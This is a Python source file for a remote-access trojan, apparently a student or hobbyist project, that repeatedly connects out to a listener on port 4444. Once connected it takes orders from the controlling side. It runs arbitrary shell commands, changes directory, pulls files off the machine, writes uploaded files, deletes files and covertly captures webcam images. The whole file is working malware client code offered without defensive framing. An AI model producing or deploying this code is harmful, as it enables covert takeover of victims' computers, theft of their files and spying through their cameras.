import socket
import subprocess
import os
import time
import cv2


while True:
    try:
        payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        payload.connect(("localhost", 4444))
    # except TimeoutError:
    #     continue
    # except ConnectionResetError:
    #     continue
    except:
        continue
    else:

        def recv_data():
            original_size = payload.recv(2048).decode("utf-8")
            original_size = int(original_size)
            data = payload.recv(2048)
            while len(data) != original_size:
                data = data + payload.recv(2048)
            return data


        def send_data(output_data):
            size_of_data = len(output_data)
            size_of_data = str(size_of_data)
            payload.send(bytes(size_of_data, "utf-8"))
            time.sleep(2.0)
            payload.send(output_data)


        while True:
            try:
                cmd = payload.recv(2048)
                cmd = cmd.decode("utf-8")
                if cmd == "exit":
                    payload.close()
                    break
                elif cmd[:2] == "cd":
                    os.chdir(cmd[3::])
                    send_data(b"Directory Changed..!!")
                    continue
                elif cmd[:8] == "download":
                    with open(f"{cmd[9::]}", "rb") as data:
                        data_read = data.read()
                        data.close()
                    send_data(data_read)
                    continue
                elif cmd[:6] == "upload":
                    data = recv_data()
                    if data == b"error":
                        continue
                    with open(f"{cmd[7::]}", "wb") as write_data:
                        write_data.write(data)
                        write_data.close()
                    continue
                elif cmd[:3] == "del":
                    subprocess.call(cmd, shell=True)
                    send_data(b"File Deleted")
                    continue
                elif cmd[:11] == "webcam_snap":
                    camera = cv2.VideoCapture(0)
                    success, image = camera.read()
                    if success:
                        img, final_img = cv2.imencode(".jpg", image)
                        final_img = final_img.tobytes()
                        send_data(final_img)
                    else:
                        send_data(b"Camera Not Found..!!")
                    continue
                    # with open('test1.png', 'wb') as w:
                    #     w.write(image)
                    #     w.close()
                output = subprocess.check_output(cmd, shell=True)
                send_data(output)
            except FileNotFoundError:
                send_data(b"Hey, This File is Not Found in this Directory")
                continue
            except subprocess.CalledProcessError:
                send_data(b"Hey, You Enterd a wrong command..!!")
            except:
                break
